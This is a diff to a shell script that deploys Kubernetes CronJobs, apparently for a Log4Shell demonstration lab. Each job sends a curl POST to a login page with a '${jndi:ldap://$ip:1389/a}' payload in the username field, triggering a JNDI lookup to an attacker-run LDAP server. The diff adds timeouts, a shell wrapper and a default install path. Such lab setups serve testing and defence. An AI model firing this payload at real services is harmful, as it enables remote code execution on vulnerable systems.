@@ -133,7 +133,7 @@ spec:
             command:
             - /bin/sh
             - -c 
-            - curl -d "uname=\\\${jndi:ldap://$ip:1389/a}&password=" -X POST http://$ip_val/login
+            - curl --connect-timeout 30 -no-keepalive --max-time 30 -d "uname=\\\${jndi:ldap://$ip:1389/a}&password=" -X POST http://$ip_val/login
           restartPolicy: OnFailure
 eof
 
@@ -169,7 +169,9 @@ spec:
             image: knoxuser/alpine-curl
             imagePullPolicy: IfNotPresent
             command:
-            - curl -d "uname=\${jndi:ldap://$ip:1389/a}&password=" -X POST http://$ip_val/login
+            - /bin/sh
+            - -c
+            - curl --connect-timeout 30 -no-keepalive --max-time 30 -d "uname=\\\${jndi:ldap://$ip:1389/a}&password=" -X POST http://$ip_val/login
           restartPolicy: OnFailure
 eof
 
@@ -241,7 +243,7 @@ eof
 }
 
 
-if [[ ( $1 == "install") ||  $1 == "Install" ||  $1 == "INSTALL" || $1 == "ins" ]]
+if [[ ( $1 == "install") ||  $1 == "Install" ||  $1 == "INSTALL" || $1 == "ins" || $1 == "" ]]
 then
 
   log4j_deploy
